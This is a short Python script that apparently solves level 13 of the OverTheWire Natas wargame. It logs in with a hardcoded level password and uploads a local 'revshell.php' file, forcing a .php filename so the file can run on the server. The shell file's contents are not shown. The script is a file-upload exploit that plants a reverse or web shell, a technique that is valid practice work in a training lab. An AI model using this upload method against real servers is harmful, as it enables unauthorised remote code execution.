import requests

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'


url = 'http://%s.natas.labs.overthewire.org'  % username

files = {'uploadedfile': open('/home/alpha/over_the_wire/natas/level13/revshell.php', 'rb')}

response = requests.post(url, files = files,  data = {"filename" : "revshell.php", "MAX_FILE_SIZE":"1000"},auth = (username, password))
print(response.text)
 